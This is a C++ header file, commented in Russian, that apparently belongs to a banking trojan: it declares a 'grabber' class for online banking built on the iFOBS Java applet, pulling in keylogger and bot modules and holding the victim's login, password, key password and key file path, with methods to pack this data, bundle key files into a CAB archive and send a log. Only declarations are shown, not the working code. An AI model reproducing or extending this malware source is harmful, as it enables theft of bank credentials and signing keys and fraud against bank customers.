
//===========================================================================
//  Грабер онланбанка работающего на Ifobs аплете
//
//  Модифицирован: Декабрь 2012
//  Версия:        1.0
//===========================================================================

#ifndef IfobsOnlineH
#define IfobsOnlineH
//---------------------------------------------------------------------------

#include "JavaAppletGrabbers.h"
#include "KeyLogger.h"
#include "BotClasses.h"


#define IFOBS_MAX_KEY_PATH_SIZE  3145728   /* Макс. размер ключа 3 мегабайта */


namespace IfobsOnline
{
	// Функция активирует грабер IfobsOnline
	bool Initialize(HWND JafaFrameWnd, DWORD ClassWndHash, const char* URL, bool IsChildWnd);
}



//******************************************************
//  Класс идентификации Ифобс банка по схеме окон
//******************************************************
class TIfobsOnlineGrabber : public TBotObject
{
private:
	HWND FSunAwtFrameWnd;
	TBotList FEdits; // Список едитов

	HWND LoginWnd;
	HWND PasswordWnd;
	HWND KeyPasswordWnd;
	HWND KeyPathWnd;
	DWORD Captions;  // Флаги найденых подписей

	string FLogin;
	string FPassword;
	string FKeyPassword;
	string FKeyFilePath;

	bool FIsIfobs;

	void   CheckWindow(HWND Wnd);
	void   InsertWnd(HWND Wnd, TBotList &L);
	bool   CheckScheme();
	HWND   GetEditByID(LONG ID);
	string PackTextData();
	void   AddFilesToCab(LPVOID Cab);

	friend int CALLBACK TIfobsOnlineGrabberEnumWnd(HWND Wnd, LPARAM Param);
public:
	TIfobsOnlineGrabber(HWND SunAwtFrameWnd);
	~TIfobsOnlineGrabber() {};

	bool inline IsIfobs() { return FIsIfobs; };

	BOOL SendLog();
};


//---------------------------------------------------------------------------
#endif
